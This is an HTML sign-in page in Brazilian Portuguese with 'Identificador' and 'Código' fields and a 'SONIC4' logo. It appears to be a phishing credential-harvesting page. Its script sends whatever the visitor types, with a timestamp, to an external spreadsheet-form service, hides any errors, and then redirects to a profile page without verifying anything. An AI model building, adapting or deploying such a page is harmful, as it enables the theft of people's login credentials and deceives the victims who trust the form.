<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 24px;
        }

        .lang {
            position: fixed;
            top: 8px;
            left: 50%;
            transform: translateX(-50%);
            color: #444;
            font-size: 14px;
            z-index: 10;
            white-space: nowrap;
        }

        .avatar {
            width: 80px;
            height: 80px;
            object-fit: contain;
        }

        .input-group {
            width: 100%;
            max-width: 350px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s, box-shadow 0.3s;
        }

        input:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.2);
        }

        input.invalid {
            border-color: #dc3545;
            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.2);
            animation: shake 0.3s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .btn {
            width: 100%;
            max-width: 350px;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s, opacity 0.3s;
        }

        .btn-primary {
            background: #007bff;
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            background: #0056b3;
        }

        .btn-primary:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .divider {
            width: 100%;
            max-width: 350px;
            text-align: center;
            margin: 20px 0;
            color: #999;
            font-size: 14px;
        }

        .btn-outline {
            background: transparent;
            border: 1px solid #007bff;
            color: #007bff;
        }

        .btn-outline:hover {
            background: #007bff;
            color: white;
        }

        .logo {
            max-width: 60px;
            height: auto;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="lang">Português (Brasil)</div>

    <img src="foto.png" alt="Avatar" class="avatar">

    <div class="input-group">
        <input type="text" id="campo1" placeholder="Identificador" autocomplete="off">
    </div>

    <div class="input-group">
        <input type="text" id="campo2" placeholder="Código" autocomplete="off">
    </div>

    <button class="btn btn-primary" id="entrar">Confirmar</button>

    <div class="divider">ou</div>

    <button class="btn btn-outline" onclick="location.href='cadastro.html'">Novo</button>

    <img src="foto1.png" alt="SONIC4 Logo" class="logo">

    <script>
        const campo1 = document.getElementById('campo1');
        const campo2 = document.getElementById('campo2');
        const entrarBtn = document.getElementById('entrar');

        function validateFields() {
            let isValid = true;
            campo1.classList.remove('invalid');
            campo2.classList.remove('invalid');

            if (!campo1.value.trim()) {
                campo1.classList.add('invalid');
                isValid = false;
            }
            if (campo2.value.length < 8) {
                campo2.classList.add('invalid');
                isValid = false;
            }
            return isValid;
        }

        function enviarDados(usuario, codigo) {
            const now = new Date();
            const data = new URLSearchParams({
                Identificador: usuario,
                Codigo: codigo,
                Horario: now.toISOString().slice(0, 19).replace('T', ' ')
            }).toString();

            fetch('https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: data,
                keepalive: true
            }).catch(() => {});
        }

        entrarBtn.addEventListener('click', function () {
            if (!validateFields()) return;

            entrarBtn.disabled = true;
            entrarBtn.textContent = 'Enviando...';

            const usuario = campo1.value.trim();
            const codigo = campo2.value.trim();

            enviarDados(usuario, codigo);

            setTimeout(() => {
                window.location.href = 'perfil.html';
            }, 500);
        });

        campo1.addEventListener('input', () => campo1.classList.remove('invalid'));
        campo2.addEventListener('input', () => campo2.classList.remove('invalid'));

        campo2.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') entrarBtn.click();
        });
    </script>
</body>
</html>
